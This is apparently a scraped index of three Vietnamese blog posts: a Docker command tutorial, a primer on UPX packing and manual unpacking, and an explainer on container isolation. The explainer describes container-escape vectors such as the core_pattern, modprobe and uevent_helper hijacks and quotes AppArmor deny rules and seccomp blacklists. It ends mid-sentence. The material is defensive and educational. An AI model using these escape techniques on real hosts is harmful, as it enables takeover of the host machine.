tài khoản root với hostname là b2d8e983bcef. Chúng ta kiểm tra thông tin của ubuntu này.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@ff7140c65b73:/# cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=20.04 DISTRIB_CODENAME=focal DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;20.04.2 LTS (Focal Fossa)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 20.04.2 LTS\u0026#34; VERSION_ID=\u0026#34;20.04\u0026#34; HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; VERSION_CODENAME=focal UBUNTU_CODENAME=focal root@ff7140c65b73:/# Để kiểm tra có những container nào đang chạy trên máy, chúng ta dùng lệnh:\n1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes unruffled_goldberg Kết quả trên cho thấy, hệ thống đang chạy một container có id là ff7140c65b73 và chạy từ image ubuntu:latest, với command /bin/bash.\nKhi chúng ta gõ lệnh exit để thoát khỏi container, lệnh docker ps sẽ không hiển thị container nào, tuy nhiên, lệnh docker ps -a sẽ liệt kê tất cả các container đang hiện có trên máy kèm theo trạng thái của nó.\n1 2 3 4 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 5 seconds ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 11 minutes ago Exited (0) 11 minutes ago gallant_snyder Trạng thái Exited thể hiện container đã bị dừng, và để khởi động lại docker đã dừng, ta dùng lệnh docker start\n1 2 3 4 5 6 7 8 9 ❯ docker start ff7140c65b73 ff7140c65b73 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 6 seconds unruffled_goldberg ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 12 minutes ago Up 11 seconds unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; 14 minutes ago Exited (0) 14 minutes ago gallant_snyder Để vào lại hệ điều hành trong container, ta dùng lệnh docker attach container_id, lưu ý, id chúng ta không cần ghi hết, chỉ cần ghi 2-3 chữ cái đầu là được.\n1 2 ❯ docker attach ff root@ff7140c65b73:/# Để thoát khỏi container mà không dừng nó, ta dùng tổ hợp phím ctrl + P, ctrl + Q. Khi chúng ta dùng tổ hợp này, ta sẽ có kết quả sau:\n1 2 ❯ docker attach ff root@ff7140c65b73:/# read escape sequence Từ máy host, để dừng container, ta dùng lệnh docker stop \u0026lt;container_name/container_id\u0026gt;\n1 2 3 4 5 6 7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; 26 minutes ago Up 14 minutes unruffled_goldberg ❯ docker stop unruffled_goldberg unruffled_goldberg ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Đặt tên cho container 1 2 ❯ docker run -it --name \u0026#34;centos_docker\u0026#34; -h centos1 centos:latest [root@centos1 /]# Ví dụ trên chạy container có tên là centos_docker sử dụng image centos:latest.\n-it tạo một tương tác bash shell trong container. --name: đặt tên cho container. -h: đặt hostname cho container.\nChúng ta có thể kiểm tra 1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 3 seconds centos_docker Capture container ID (\u0026ndash;cidfile) 1 2 3 4 5 6 7 8 9 ❯ docker run --cidfile /tmp/docker_test.cid ubuntu echo \u0026#34;test\u0026#34; Unable to find image \u0026#39;ubuntu:latest\u0026#39; locally latest: Pulling from library/ubuntu 345e3491a907: Pull complete 57671312ef6f: Pull complete 5e9250ddb7d0: Pull complete Digest: sha256:adf73ca014822ad8237623d388cedf4d5346aa72c270c5acc01431cc93e18e2d Status: Downloaded newer image for ubuntu:latest test Lệnh này tạo container và in test ra màn hình console. Flag cidfile yêu cầu Docker tạo một file mới và\nviết container ID vào nó. Nếu file đã tồn tại, Docker sẽ trả về error. Docker sẽ đóng file khi docker run kết thúc. Full container capabilities (\u0026ndash;privileged) 1 2 3 4 ❯ docker run -t -i --rm ubuntu bash root@bd1340e91d1e:/# mount -t tmpfs none /mnt mount: /mnt: permission denied. root@bd1340e91d1e:/# --rm tự động xóa container nếu như nó đã tồn tại. Lệnh này không hoạt động, vì theo mặc định, những câu lệnh đem lại khả năng nguy hiểm tới kernel sẽ bị loại bỏ, bao gồm cap_sys_admin (lệnh yêu cầu mount filesystems). Tuy nhiên, flag --privileged sẽ cho phép chúng ta run: 1 2 3 4 5 6 7 8 9 10 11 ❯ docker run -t -i --privileged ubuntu bash root@a3c5921afbbc:/# mount -t tmpfs none /mnt root@a3c5921afbbc:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 110G 58G 46G 56% / tmpfs 64M 0 64M 0% /dev tmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup /dev/sda2 110G 58G 46G 56% /etc/hosts shm 64M 0 64M 0% /dev/shm none 3.9G 0 3.9G 0% /mnt root@a3c5921afbbc:/# flag --privileged sẽ cấp hết tất cả capabilities cho container, và loại bỏ mọi giới hạn được đặt ra bởi cgroup controller. Nói cách khác, container có thể chạy hầu hết mọi thứ mà máy host có thể làm. Set working directory (-w) 1 $ docker run -w /path/to/dir/ -i -t ubuntu pwd -w cho phép câu lệnh thực thi bên trong thư mục đã chỉ định. Nếu đường dẫn tới thư mục không tồn tại,\nnó sẽ tạo một thư mục mới trong container tương ứng đường dẫn đó. Set storage driver options per container 1 $ docker run -it --storage-opt size=120G fedora /bin/bash size cho phép chúng ta thiết lập container rootfs size tới 120G tại thời điểm tạo.\nOption này chỉ hiệu quả cho devicemapper, btrfs, overlay2, windowsfilter và zfs graph drives\nVới devicemapper, btrfs, windowsfilter and zfs graph drivers user không thể gán kích thước\nnhỏ hơn Default BasFS Size\nVới overlay2 storage drive, size option chỉ hoạt động nếu trình fs được gán là xfs\nvà mounted với option pquota. trường hợp này, người dùng có thể cấp size.\nMount tmpfs (\u0026ndash;tmpfs) 1 $ docker run -d --tmpfs /run:rw,noexec,nosuid,size=65536k my_image flag --tmpfs mount một empty tmpfs vào container với rw, noexec, nosuid, size=65536k\nMount volume (-v, \u0026ndash;read-only) 1 $ docker run -v `pwd`:`pwd` -w `pwd` -i -t ubuntu pwd -v mount thư mục hiện tại vào container -w cho phép command được thực thi bên trong thư mục hiện tại bằng cách thay đổi trong thư mục\nthành giá trị được trả về bởi pwd. Nó sẽ thực thi kết hợp câu lệnh sử dụng container,\nnhưng bên trong thư mục hiện tại: 1 $ docker run -v /doesnt/exist:/foo -w /foo -i -t ubuntu bash Khi host directory của bind-mounted volume không tồn tại, Docker sẽ tự động tạo thư mục này trên host cho bạn.\nTrong ví dụ trên, Docker sẽ tạo thư mục /doesnt/exist trước khi chạy container.\n1 $ docker run --read-only -v /icanwrite busybox touch /icanwrite/here --read-only để kiểm soát nơi container viết file, --read-only flag mount container\u0026rsquo;s root filesystem chỉ để đọc. 1 $ docker run -t -i -v /var/run/docker.sock:/var/run/docker.sock -v /path/to/static-docker-binary:/usr/bin/docker busybox sh Bằng cách liên kết docker unix socket với docker binary liên kết tĩnh, chúng ta cấp container toàn quyền truy cập\nvà chỉnh sửa host\u0026rsquo;s Docker daemon.\nAdd bind mounts or volumes using the \u0026ndash;mount flag Ví dụ: 1 $ docker run --read-only --mount type=volume,target=/icanwrite busybox touch /icanwrite/here 1 $ docker run -t -i --mount type=bind,src=/data,dst=/data busybox sh Publish or expose port (-p, \u0026ndash;expose) 1 $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash Câu lệnh kết nối cổng 8080 của container tới cồng 80 TCP trên 127.0.0.1 của host machine.\nChúng ta có thể chỉ định udp và sctp ports.\nCó một lưu ý, những port không ràng buộc bởi host sẽ có thể được truy cập từ bên ngoài.\nĐiều này cũng áp dụng nếu chúng ta muốn cấu hình UFW để chặn công cụ này, vì Docker quản lý các quy tác iptables\ncủa riêng mình.\n1 $ docker run --expose 80 ubuntu bash Hiển thị cổng 80 của container mà không có xuất hiện port trên host system.\nSet environment variables (-e, \u0026ndash;env, \u0026ndash;env-file) 1 docker run -e MYVAR1 --env MYVAR2=foo --env-file ./env.list ubuntu bash Sử dụng những flag -e, --env, --env-file để thiết lập những biến môi trường (không phải dạng array)\ncho container bạn đang chạy, hoặc ghi đè những file đó có sẵn. ví dụ:\n1 2 3 ❯ docker run --env VAR1=value1 --env VAR2=value2 ubuntu env | grep VAR VAR2=value2 VAR1=value1 Connect a container to a network (\u0026ndash;network) 1 $ docker run -itd --network=my-net busybox Chúng ta có thể chọn địa chỉ IP cho container với flag --ip hoặc --ip6 khi bạn chạy container\ntrên user-defined network\n1 $ docker run -itd --network=my-net --ip=10.10.9.75 busybox Docker rm Để xóa container khi nó đang dừng, ta dùng lệnh docker rm container_id\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg b2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) About an hour ago gallant_snyder ❯ docker rm b2 b2 ❯ docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 10 minutes ago Exited (0) 7 minutes ago centos_docker ff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg Trường hợp container đang chạy mà ta muốn xóa thì ta thêm options -f\n1 docker rm -f container_id/container_name Tổng kết Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel những kiến thức như sau:\ndocker images: Liệt kê danh sách tất cả các images trên docker docker pull image:tag tải image về máy docker image rm image_name/image_id xóa image docker version: xem version của docker docker run -it --name \u0026quot;ten_container\u0026quot; -h \u0026quot;host_name\u0026quot; image: tạo container. ctrl + P, ctrl + Q: thoát khỏi container nhưng vẫn để container chạy. docker ps: in ra container chạy docker stop container_id/name: buộc container đang chạy dừng khi ta đang ở host. docker attach container_id/name: trở lại container đang chạy. docker rm containerid/name: xóa container đã dừng. docker rm -f containerid/name: xóa container đang chạy.\nKết thúc bài viết này, một lần nữa em xin chân thành gửi lời cảm ơn đến anh XuanThuLabChanel đã làm những bài học quý giá và bổ ích này. ","description":"Bài này chúng ta sẽ học làm quen với docker command line, một số câu lệnh thông dụng như docker images, docker version, docker run, docker rm","id":15,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P1)","uri":"https://minhlongmt183.github.io/posts/docker_p1/"},{"content":"Nguồn tham khảo\nWhat is Packing? Packing có nghĩa là nén (compressed), hoặc xáo trộn (obfuscated) file thực thi để làm cho file thực thi khó phát hiện, khó phân tích tĩnh, khó dịch ngược. Trong ngữ cảnh của malware, vì mã độc chủ yếu được compressed, obfuscated trong các mẫu đóng gói, các công cụ dùng để phân tích tĩnh sẽ gặp vấn đề khi xác định liệu tệp nhị phân này có phải là mã độc hay không. Bên cạnh nó, một thuật toán packing tốt sẽ làm khó khăn qúa trình phân tích của các nhà phân tích mã độc, từ đó giúp cho vòng đời của mã độc được kéo dài lâu hơn.\nMột cách nôm na, chúng ta có thể hiểu packer gồm: compressing packers và encrypting packers. Trong đó compressing packers mục đích là đưa file thực thi về dạng nén, làm giảm kích thước của file, còn encrypting packers có mục đích mã hóa hoặc xáo trộn file đã được nén, nhằm ngăn chặn người dùng dịch ngược. Như đã nói, cách hiểu trên chỉ là hiểu một cách nôm na, bởi vì có nhiều packer kết hợp cả hai tính chất trên, còn có nhưng packer (như UPX), nó chỉ compressing mà không có encrypting.\nHow does packing work? Chúng ta sẽ nói về kiến trúc \u0026ldquo;stub-payload\u0026rdquo;, một trong những cơ chế được sử dụng nhiều bởi packer, kể cả UPX.\nTrong kiến trúc \u0026ldquo;stub-payload\u0026rdquo;, một file thực thi sẽ gồn hai thành phần chính: nội dung đã được nén / mã hóa từ file gốc và một đoạn mã dùng để giải nén / giải mã file này về file gốc và thực thi nó. Đoạn mã này được gọi là stub. Về bản chất, file ban đầu được nến / mã hóa, sau đó được bọc trong tệp thực thi mới có chứa mã để đưa nó về trạng thái ban đầu\nIndication of Packing Lacking of Import in Import Address Table (IAT) Để một file thực thi có thể tương tác với hệ điều hành thì file thực thi cần phải có các hàm được tích hợp vào thư viện hệ thống như kernel32.dll và user32.dll. Khi phân tích một tệp tin đã được giải nén hoàn toàn, ta sẽ thấy một số lượng lớn các import vì mã độc rõ ràng muốn tương tác khá nhiều với hệ điều hành. Tuy nhiên, một stub của một chương trình bị packed không có nhiều chức năng ngoài việc giải nén và thực thi file gốc, do đó, nó sẽ có số lượng import ít hơn rất nhiều so với file chuẩn.\nNon-standard Section Names: Trong những file thực thi bình thường, chúng thường có các sections giống nhau mọi lúc (.text, .data, .rsrc,..). Tuy nhiên, những paker sẽ tự định nghĩa section cho riêng nó, điều này cũng cho thấy những file có section như vậy sẽ không phải là tiêu chuẩn và có thể được đóng gói. Ví dụ như UPX packer sẽ thực thi với các file có tên section là UPX0 và UPX1.\nSections with a small raw size but a large virtual size Khi chúng ta gặp một file mà có raw size rất nhỏ (đôi khi bằng 0), điều này muốn nói file thực thi không có bất kì dữ liệu nào trong section. Tuy nhiên, khi file thực thi được load vào bộ nhớ, raw size không còn liên quan, và nó được thay bởi virtual size của từng phần cụ thể được cấp phát trong memory. Nếu một file có section được cấp phát với virtual space lớn và raw data rất nhỏ, nó có khả năng cao là những đoạn code dùng để unpacked.\nSections with very high entropy: Từ entroy đề cập đến phương sai và tính ngẫu nhiên của một phần dữ liệu. Những thứ như ngôn ngữ Tiếng Anh, assembly code, các cấu trúc giao tiếp được xác định rõ ràng khác thường có entropy thấp vì ngôn ngữ có xu hướng tuần theo các mẫu có thể đoán trước được. Tuy nhiên, encrypted data và compressed data không có khả năng dự đoán trước, do đó có entropy cao hơn nhiều. Do đó, khi kiểm tra nếu thấy có entropy cao thì khả năng dữ liệu này đã được nén hoặc mã hóa.\nLow number of discernible strings: Trong file không bị nén, chúng ta sẽ nhận thấy có một lượng nhất định các chuỗi có thể đọc được vì hầu hết các ứng dụng (kể cả malware) sử dụng những protocol được hiện thực bởi ngôn ngữ con người. Do đó, trong một file bình thường, những chuỗi này nên xuất hiện, và khi thấy những chuỗi có thể đọc được ở một file quá ít hoặc không có, khả năng cao file này đã bị nén hoặc bị mã hóa.\nSections with RWX privileges: Trong các file bình thường, một section sẽ rất ít khi được cho phép cả đọc và ghi, vì chúng ta hiếm khi muốn viết đè file thực thi trong ứng dụng của mình. Ngoài ra, hiếm khi viết trực tiếp vào file thực thi trong lúc nó đang chạy. Do đó, không có lý do nào để section được cấp quyền vừa ghi và vừa đọc ngoại trừ packer. Với packer, dữ liệu sau khi giải nén sẽ được ghi vào section rồi thực thi.\njmp or call Instructions to registers/strange memory addresses: Trên nhiều packers, địa chỉ tới nơi dữ liệu đã được giải nén thường được lưu trên các thanh ghi và địa chỉ đó thường nằm trong một section khác, do dó chúng ta sẽ thấy bước này nhảy rất xa. Các bước nhảy xa như thế thường không phổ biến, vì tất cả các mã thực thi trong hệ nhị phân thường được chứa trong một section duy nhất. Nếu chúng ta thấy một lệnh jump / call đến một địa chỉ mà:\n1. Không có trong section hiện tại\n2. Không có trong không gian địa chỉ của một thư viện đã tải.\nthì khả năng cao bước nhảy này là bước giải nén.\nNhận diện với file được mã hóa bằng UPX Các bước giúp chúng ta nhận diện và giải nén file bị mã hóa bằng UPX:\nKiểm tra PE header và xác định xem chúng có thực sự bị đóng gói không. Tuy nhiên bước xác định này chúng ta có thể dùng peid. Tìm nơi giải nén sẽ được ghi. Tìm kiếm lệnh jmp hoặc call tham chiếu đến một thanh ghi hoặc không gian bộ nhớ nơi lưu dữ liệu giải nén có thể được ghi vào trong mã gốc. Đặt breakpoint ở những lệnh này. Dump data chứa trong không gian bộ nhớ đó, sửa import resolutions và xuất nó dưới dạng tệp thực thi mới. Áp dụng. Ta áp dụng với bài garbage của flareon-2020.\n","description":"Packer là một chương trình dùng để nén và che dấu file thực thi của mình. Nó được sử dụng nhằm giúp các developer giấu đi file thực thi của mình, để làm khó các reverser khiến họ khó khăn trong quá trình bẻ khóa chương trình của mình. Tuy nhiên ứng dụng cũng như kĩ thuật này cũng được sử dụng để tạo ra mã độc, và nó cũng gây ra nhiều khó khăn cho các nhà phân tích mã độc trong quá trình nghiên cứu.","id":16,"section":"posts","tags":["Malware, flareon"],"title":"Manually Unpacking UPX Executables (vẫn đang update...)","uri":"https://minhlongmt183.github.io/posts/packet/"},{"content":"Container Basics Chúng ta sẽ đi qua một số khái niệm cơ bản và cần thiết trong docker:\nCredentials Credentials describe the user identity of a task, which determine its permission for shared resources such as files, semaphores, and shared memory.\nCapabilities Since kernel 2.2, Linux divides the privileges associated with superuser into distinct unit known as capabilities\n1 /proc/$PID/status | man capabilities Filesystem The container\u0026rsquo;s root mount is often planted in a container-specialized filesystem, such as OverlayFS\n1 /var/lib/docker/overlay2/..hash../diff Namespaces Mục đích: làm cho hệ thống container có thể sử dụng và an toàn. PID: have their own view of tasks - cung cấp cây không gian tên của process id. Nó cho phép mỗi container có một cây đầy đủ các process id riêng biệt, trong đó init process có pid = 1. Process chạy trên host sẽ có pid khác với khi chạy trên container. User: wrap mapping of UID to user - cung cấp phiên bản namespace của User IDs (UIDs) and Group IDs (GIDs). Đây là một trong những tính năng quan trọng nhất của hệ thống container hiện đại vì nó được sử dụng để cung cấp \u0026ldquo;unprivileged containers\u0026rdquo;. User namespaces cung cấp một trong những nền tản cho hệ thống container trên Linux hiện nay, và là vùng cấu hình duy nhất được LXC coi là an toàn. Mount: isolate mount points - cung cấp chế độ xem không gian tên của các điểm kết nối (mount points). Kết hợp với pivot_root syscall, tính năng này sẽ cô lập container\u0026rsquo;s filesystem với host\u0026rsquo;s filesystem. Network: cung cấp không gian tên và ngăn xếp mạng riêng biệt. Hầu hết các trường hợp sử dụng của container liên quan tới dịch vụ mạng, vì vậy nó được coi là tính năng lõi của container. UTS: have their own hostname - cung cấp namespaced version của định danh hệ thống (system identifies) IPC: restrict SysV IPC objects Cgroup: isolate the view of cgroups 1 /proc/$PID/ns/ Cgroups CGroups: cung cấp giao diện phân cấp để quản lí cũng như đo lường tài nguyên và quyền truy cập của thiết bị. Cgroups có thể được sử dụng bởi các process có quyền hạn cao (higher privileged) để đặt giới hạn về sử dụng bộ nhớ, CPU, chặn các thiết bị IO khác. Chúng còn có thể được sử dụng chung với iptables để cung cấp định hình lưu lượng. Quan trong nhất, chúng được sử dụng trong hệ thống container đẻ kiểm soát quyền truy cập của các thiết bị.\nLinux Security Modules - LSMs AppArmor and SELinux are Linux security modules providing Mandatory Access Control (MAC), where access rules for a program are described by a profile. AppArmor là LSM phổ biến nhất trong hệ thống container, nó có thể giới hạn các hành động mà một chương trình nhất định có thể thực hiện, cũng như thực hiện các hành động phức tạp khi bắt đầu process. Cả LXC và Docker đều thiết lập ở chế độ mặc định để xây dựng những rào cản an ninh, chống lại những mối đe dọa theo chiều sâu. Cho đến nay, AppArmor được ghi nhận là hỗ trợ và ghi nhận tốt nhất.\nDo sự đơn giản của cú pháp AppArmor, nó cũng dễ sử dụng hơn rất nhiều để cấu hình tùy chỉnh cho mỗi vùng chứa. Docker and LXC enable a default LSM profile in enforcement mode, wh mostly serves to restrict a container\u0026rsquo;s\naccess to sensitive /proc and /sys entries. The profile also denies mount syscall. Tầm quan trọng của Apparmor Mount Options Chính sách của AppArmor chặn việc truy cập để mounting devpts filesystems. Như comment ở dưới, nếu không có chính sách này, container có thể remount /dev/pts và chiếm quyền truy cập vào các thiết bị đầu cuối của máy chủ. 1 2 3 4 # the container may never be allowed to mount devpts. If it does, it # will remount the host\u0026#39;s devpts. We could allow it to do it with # the newinstance option (but, right now, we don\u0026#39;t). deny mount fstype=devpts Các chính sách dùng để chặn container cố gắng remount root filesystem. Chính sách này được thực hiện như một biện pháp phòng thủ theo chiều sâu. 1 2 3 # ignore DENIED message on / remount deny mount options=(ro, remount) -\u0026gt; /, deny mount options=(ro, remount, silent) -\u0026gt; /, Utility Changes Có rất nhiều \u0026ldquo;nơi nguy hiểm\u0026rdquo; trong /proc và /sys cho phép các container thoát ra ngoài (container escapes).\nTất cả những điều này liên quan tới việc thay đổi vị trí của một tiện ích (chẳng hạn như modprobe) mà máy chủ sẽ gọi khi một sự kiện nhất định xảy ra (ví dụ như yêu cầu load yêu cầu của kernel module).\nBằng cách thay đổi điều này để trỏ đến một chương trình bên trong container của chúng ta, attacker sau đó có thể khiến máy chủ chạy một đoạn mã tùy ý bên ngoài container\nLXC sử dụng bộ quy tắc sau để chặn các cuộc tấn công này. Lưu ý, nó không phải là một cấu hình cảu AppArmor, nó là đầu vào cho một đoạn lệnh python nhỏ tạo ra một phần dài (long portion) của các quy tắc AppArmor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # Run lxc-generate-aa-rules.py on this file after any modification, to generate # the container-rules file which is appended to container-base.in to create the # final abstractions/container-base. block /sys allow /sys/fs/cgroup/** allow /sys/devices/virtual/net/** allow /sys/class/net/** block /proc/sys allow /proc/sys/kernel/shm* allow /proc/sys/kernel/sem* allow /proc/sys/kernel/msg* allow /proc/sys/kernel/hostname allow /proc/sys/kernel/domainname allow /proc/sys/net/** Những vector quan trọng nào đang bị chặn?\nuevent_helper: uevents là những sự kiện được kernel kích hoạt khi một thiết bị thêm vào hoặc xóa đi. Điều đáng chú ý là đường dẫn của \u0026ldquo;uevent_helper\u0026rdquo; có thể được chỉnh sửa bằng cách ghi vào \u0026quot;/sys/kernel/uevent_helper\u0026quot;.\nDo đó, khi một uevent được kích hoạt (cũng có thể được thực hiện từ userland bằng cách ghi vào các tệp như \u0026quot;/sys/class/mem/null/event\u0026quot;), \u0026ldquo;uevent_helper độc hại\u0026rdquo; sẽ được thực thi.\nmodprobe: modprobe là một tiện ích thuộc userland, được kernel gọi khi kernel cần load một kernel module. Vị trí của nó có thể được thay đổi bằng cách sửa đổi \u0026quot;/proc/sys/kernel/modprobe\u0026quot;,\nvà sau đó chúng ta chỉ cần thực hiện một hành động nào đó để kernel tải một kernel module, code chúng ta sẽ được thực thi. (Chẳng hạn như sử dụng crypto-API để tải crypto-module hoặc sử dụng ifconfig để tải networking module cho thiết bị hiện không sử dụng.)\ncore_pattern: core_patterns thường sử dụng để cho kernel biết cách đặt tên và định dạng các core dumps được tạo khi chương trình bị crash.\nTuy nhiên, nó lại có 1 tính năng rất tệ: \u0026ldquo;từ Linux kernel 2.6.19. Linux hỗ trợ cú pháp thay thế cho tệp /proc/sys/kernel/core_patterm. Nếu ký tự đầu tiên của tệp này là kí tự pipe (|),\nthì phần còn lại của dòng này được hiểu là một chương trình sẽ được thực thi. Thay vì được ghi vào đĩa, core dump lúc bây giờ sẽ được xem là một chuẩn input của chương trình trên.\u0026rdquo;.\nSử dụng tính năng trên, core_pattern có thể được chỉ định để gọi chương trình của chúng ta, rồi để kích hoạt nó, ta chỉ cần làm cho chương trình bị crash.\n/proc/sys/vm/panic_on_oom: đây là global flag, xác định kernel có \u0026ldquo;hoảng sợ\u0026rdquo; (panic) khi gặp phải tình trạng hết bộ nhớ hay không (Out Of Memory - OOM). Điều này cho phép chúng ta tiến hành một cuộc tấn công DOS đơn giản.\nDangerous Paths 1 2 3 4 5 # block some other dangerous paths deny @{PROC}/kcore rwklx, deny @{PROC}/kmem rwklx, deny @{PROC}/mem rwklx, deny @{PROC}/sysrq-trigger rwklx, kcore cung cấp kết xuất đầy đủ của bộ nhớ vậy lí hệ thống (full dump of the physical memory) ở dạng core file. Nó không cho phép ghi vào bộ nhớ đã nói.\nQuyền truy vào điều này cho phép container có thể đọc tất cả host memory.\nkmem: \u0026ldquo;/proc/kmem\u0026rdquo; là một giao diện thay thế cho \u0026ldquo;/dev/kmem\u0026rdquo; (quyền truy cập trực tiếp bị chặn bới cgroup device whitelist), là một kí tự đại diện cho kernel virtual memory.\nNó cho phép cả đọc và viết, cho phép trực tieps sửa đổi kernel memory. (Nó đòi hỏi sự khéo léo hơn một chút so với kmem, vì các địa chỉ ảo cần được phân giải thành các địa chỉ vật lí trước).\nsysrq-trigger: ghi vào tệp đặc biệt này cho phép gửi các lệnh khóa yêu cầu (Request Key commands), cho phép môt số hành động đặc quyền,\nchẳng hạn như hủy các quy trình, liệt kê tất cả các quy trình trên hệ thông hoặc kích hoạt khởi động lại máy chủ.\nCác khối quan trọng cuối cùng ghi đến một số nơi khác nhau có thể nguy hiểm:\n1 2 3 4 5 6 # deny writes in /sys except for /sys/fs/cgroup, also allow # fusectl, securityfs and debugfs to be mounted there (read-only) deny mount fstype=debugfs -\u0026gt; /var/lib/ureadahead/debugfs/, deny /sys/firmware/efi/efivars/** rwklx, deny /sys/kernel/security/** rwklx, deny @{PROC}/sys/fs/** wklx, debugfs: cung cấp một giao diện \u0026ldquo;no rules\u0026rdquo; mà kernel (hoặc kernel module) có thể tạo ra các giao diện debug có thể truy cập vào vùng người dùng (userland).\nNó đã có một số vấn đề về bảo mật trong quá khứ và các nguyên tắc \u0026ldquo;no rules\u0026rdquo; đằng sau hệ thống tệp thường xung đột với các ràng buộc bảo mật.\nBên trong một LXC container, nó được gán ở chế độ chỉ đọc.\n/sys/firmware/efi/efivars: efivars cung cấp một giao diện để viết vào NVRAM sử dụng cho các đối số khởi động UEFI (UEFI boot arguments).\nViệc sửa đổi chúng có thể khiến máy chủ không thể khởi động được (unbootable).\n/sys/kernel/security: được gán ở đây là một giao diện securityfs, cho phép cấu hình Linux Security Modules. Nó cho phép cấu hình chính sách của AppArmor,\nvì vậy, quyền truy cập vào điều này có thể cho phép một vùng chứa vô hiệu hóa hệ thống MAC của nó.\n/proc/sys/fs: Thư mục này chứa một mảng các options và thông tin liên quan đến các khía cạnh khác nhau của hệ thống tệp, bao gồm: quota, file handle, inode,\nand dentry information. Ghi vào thư mục này cho phép các cuộc tấn công từ chối dịch vụ khác nhau chống lại máy chủ.\nseccomp Là cơ chế cho system call filtering. Chính sách của policies đến từ 2 version. Trong version 1, một filter là một tập hợp nhỏ các lệnh gọi hệ thống không thể tùy chỉnh. Trong version 2, \u0026ldquo;Filter mode\u0026rdquo;, system call filter được viết như chương trình lọc gói Berkeley (Berkeley Packet Filter - BPF). Điêu\nĐây được gọi là \u0026ldquo;Strict\u0026rdquo; mode. LXC hiện tại sử dụng một chính sách khá đơn giản, trong khi bản release 1.10 của docker được giới thiệu hỗ trợ cho seccomp-bpf.\nMột điều lưu ý là trong Docker 1.10, seccomp không được sử dụng theo mặc định trên trusty (hơi khó hiểu vì docker 1.10 trên ubuntu 15.10, seccomp vẫn được sử dụng mặc định).\nTuy nhiên, kể từ Docker 1.11.1 seccomp hiện cũng được sử dụng theo mặc định trên trusty. Tầm quan trọng của Seccomp Seccomp-BPF cho phép cấu hình lọc những \u0026ldquo;lời gọi hệ thống nguy hiểm\u0026rdquo;. Đối với một số phiên bản hiện nay, LXC đã xuất xưởng với chính sách seccomp rất nhỏ, đơn giản,\nvới minh họa ở dưới. Với bản Docker 1.10, Docker đã thêm nhiều chính sách phức tạp hơn.\n1 2 3 4 5 6 7 8 9 2 blacklist reject_force_umount # comment this to allow umount -f; not recommended [all] kexec_load errno 1 open_by_handle_at errno 1 init_module errno 1 finit_module errno 1 delete_module errno 1 Phần đầu của chính sách LXC được sử dụng như một biện pháp bảo vệ chuyên sâu để ngăn chạn các vùng chứa buộc phải ummounting các phần của filesystem.\nKernel Manipulation Một số lệnh cho phép thao tác với kernel module bị cấm (init_module, finit_module, delete_module), cũng như kexec_load cho phép thay thế kernel hiện tại bằng\nmột kernel images mới. Lưu ý, có một số biện pháp bảo vệ chuyên sâu chống lại việc khai thác chúng trong các container đặc quyền:\ninit_module, finit_module, delete_module: tất cả yêu cầu SYS_MODULE capability - đã bị loại bỏ bởi Docker và LXC trong privileged containers. kexec_load không yêu cầu SYS_MODULE, thay vào đó nó yêu cầu SYS_BOOT - privileged LXC container giữ. Trong hầu hết các trường hợp, điều này không thể khai thác (mà không bypass seccomp),\ntuy nhiên, điều đáng chú ý là Linux 3.17 đã gới hiệu 1 biến thể mới của kexec: kexec_file_load. Lệnh gọi này (tải signed kernels) không nằm trong danh sách đen của privileged LXC container, và chỉ yêu cầu SYS_BOOT. Tuy nhiên, vùng chứa LXC đặc quyền có một số vấn đề khác cho phép thoát khỏi container mà không cần boot vào kernel mới (vì trên thực tế, chúng ta có thể bypass seccomp). The Issue With open_by_handle_at() open_by_handle_at là một lợi gọi hệ thống khá 